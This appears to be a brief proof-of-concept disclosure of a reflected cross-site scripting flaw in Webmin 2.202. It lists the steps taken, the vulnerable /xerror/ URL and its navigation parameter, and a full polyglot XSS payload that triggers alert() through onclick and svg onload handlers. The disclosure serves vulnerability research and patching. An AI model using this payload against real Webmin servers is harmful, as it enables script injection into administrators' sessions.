@@ -1,0 +1,15 @@
+#Title : Reflected Xss in Webmin 2.202
+#Researcher : Abhash Khanal
+#vendor:https://webmin.com/
+#Version Affected : 2.202
+date:18 sept 2024
+
+Poc 
+
+1) I installed  webmin 2.202 in my linux environment
+2) i fetched diffrent urls
+3)I then found https://127.0.0.1:10000/xerror/?xnavigation=1 the url
+4) i saw the parameter navigation in url.
+5) now i inserted a payload inside the parameter in the url itself.
+6) the payload used jaVasCript:/-//*\/*'/"//(/ */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+7) the xss will be reflected
